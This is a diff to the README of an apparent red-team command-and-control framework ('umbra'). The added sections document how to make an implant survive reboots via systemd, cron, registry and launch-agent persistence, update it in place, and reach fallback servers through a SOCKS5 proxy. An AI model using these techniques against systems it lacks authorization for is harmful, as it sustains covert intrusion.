@@ -181,6 +181,35 @@ the event loudly and pushes an `alert` event, which the console shows like
 any other event.  The cooldown keeps a noisy agent from alerting on every
 check-in.  `umbra alerts` lists the rules the server is using.
 
+### Keeping the implant alive
+
+```bash
+umbra persist web-01                     # install it so it survives a reboot
+umbra persist web-01 --method systemd    # a specific method
+umbra update web-01 /tmp/umbra-beacon --sha256 <digest>
+```
+
+The persistence is the one the platform offers: a scheduled task and a
+registry key on Windows, a systemd user unit and a cron entry on Linux, a
+launch agent on macOS.  The report says what was done, so it can be undone.
+
+The update replaces the running binary: the new one is pushed to the host
+first (the `upload` task), the digest is checked, and only then is the old
+binary swapped out.  An implant that installs a file nobody verified is an
+implant that installs whatever the network sent it.
+
+### Keeping the implant reachable
+
+The beacon can know more than one address of the team server:
+
+```bash
+UMBRA_SERVERS=10.0.0.5:4001,10.0.0.9:4001 UMBRA_PROXY=127.0.0.1:1080 ...
+```
+
+When the first address is down, the beacon tries the next one, so a server
+that moves does not take the implant with it.  `UMBRA_PROXY` routes the
+connection through a SOCKS5 proxy, for a network that only lets a proxy out.
+
 ### Finding things on the target
 
 ```bash
@@ -238,6 +267,11 @@ off exponentially up to 5 minutes, so a beacon never hammers a dead server.
   a crash cannot lose a task — at the cost of possibly executing it twice. Task
   kinds are not idempotent by default, so check `task.list` after a restart.
 * History is capped at 20 000 tasks (oldest completed tasks are pruned).
+* A task that was delivered but never answered is failed after
+  `task_timeout_s` (default 300 s, `0` disables it) and the consoles get a
+  `task.timeout` event.  The task is **not** queued again: a task that may
+  have run must not run a second time, so the operator decides what happens
+  next.
 * To reset an engagement: stop the server, delete `data_file`, **and rotate the
   agent PSK and operator tokens** (delete the implants or they will simply
   re-register).
